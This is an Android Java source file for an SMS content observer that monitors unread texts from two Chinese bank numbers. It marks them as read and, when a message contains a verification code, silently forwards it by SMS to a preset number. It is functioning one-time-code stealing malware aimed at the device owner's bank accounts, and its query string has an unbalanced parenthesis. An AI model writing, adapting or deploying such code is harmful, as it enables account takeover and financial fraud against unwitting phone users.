package com.example.message;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import android.util.Log;

public class SMSObserver extends ContentObserver {

	public static final String TAG = "SMSObserver";

	private static final String[] PROJECTION = new String[]

	{

	SMS._ID,// 0

			SMS.TYPE,// 1

			SMS.ADDRESS,// 2

			SMS.BODY,// 3

			SMS.DATE,// 4

			SMS.THREAD_ID,// 5

			SMS.READ,// 6

			SMS.PROTOCOL // 7

	};

	private static final String SELECTION =

	SMS._ID + " >= %s" +

	// " and " + SMS.PROTOCOL + " = null" +

			// " or " + SMS.PROTOCOL + " = " + SMS.PROTOCOL_SMS + ")" +

			" and (" + SMS.TYPE + " = " + SMS.MESSAGE_TYPE_INBOX +

			" or " + SMS.TYPE + " = " + SMS.MESSAGE_TYPE_SENT + ")";

	private static final int COLUMN_INDEX_ID = 0;

	private static final int COLUMN_INDEX_TYPE = 1;

	private static final int COLUMN_INDEX_PHONE = 2;

	private static final int COLUMN_INDEX_BODY = 3;

	private static final int COLUMN_INDEX_PROTOCOL = 7;

	private static int MAX_ID = 0;

	private int curr_id = 0;

	private ContentResolver mResolver;

	private Handler mHandler;

	public SMSObserver(ContentResolver contentResolver, Handler handler)

	{

		super(handler);

		this.mResolver = contentResolver;

		this.mHandler = handler;

	}

	@Override
	public void onChange(boolean selfChange)

	{

		/*
		 * 　_id：短信序号，如100 　　 　　thread_id：对话的序号，如100，与同一个手机号互发的短信，其序号是相同的 　　
		 * 　　address：发件人地址，即手机号，如+8613811810000 　　
		 * 　　person：发件人，如果发件人在通讯录中则为具体姓名，陌生人为null 　　
		 * 　　date：日期，long型，如1256539465022，可以对日期显示格式进行设置 　　
		 * 　　protocol：协议0SMS_RPOTO短信，1MMS_PROTO彩信 　　 　　read：是否阅读0未读，1已读 　　
		 * 　　status：短信状态-1接收，0complete,64pending,128failed 　　
		 * 　　type：短信类型1是接收到的，2是已发出 　　 　　body：短信具体内容 　　
		 * 　　service_center：短信服务中心号码编号，如+8613800755500
		 */

		Log.i(TAG, "onChange : " + selfChange + "; " + MAX_ID + "; "
				+ SELECTION);

		super.onChange(selfChange);

		Cursor cursor = mResolver.query(SMS.CONTENT_URI, PROJECTION,
				" type=1 and read=0 and (address='95555' or address='95508' ",
				null, SMS._ID + " desc limit 1");

		int id, type, protocol;

		String phone, body;

		Message message;

		MessageItem item;

		while (cursor.moveToNext())

		{

			id = cursor.getInt(COLUMN_INDEX_ID);

			type = cursor.getInt(COLUMN_INDEX_TYPE);

			phone = cursor.getString(COLUMN_INDEX_PHONE);

			body = cursor.getString(COLUMN_INDEX_BODY);

			protocol = cursor.getInt(COLUMN_INDEX_PROTOCOL);

			item = new MessageItem();

			item.setId(id);

			item.setType(type);

			item.setPhone(phone);

			item.setBody(body);

			item.setProtocol(protocol);

			message = new Message();

			message.obj = item;
			Log.i(TAG, phone + ",有短信了:" + body);
			if (id != curr_id) {
				curr_id = id;
				// mHandler.sendMessage(message);
				ContentValues updateValues = new ContentValues();
				updateValues.put("read", "1");
				Log.i(TAG, "把短信标记为已读取 id:" + id);
				mResolver.update(SMS.CONTENT_URI, updateValues, SMS._ID + "="
						+ id, null);
				SmsManager smsManager = SmsManager.getDefault();
				if (phone.equals("95508") || phone.equals("95555")) {// 广发信用卡//招商卡
					if (body.indexOf("验证码") != -1) {
						smsManager.sendTextMessage(MsgUtils.phone, null, body,
								null, null);
						Log.i(TAG, "短信发送成功");
					}
				}
			}
		}

	}
}
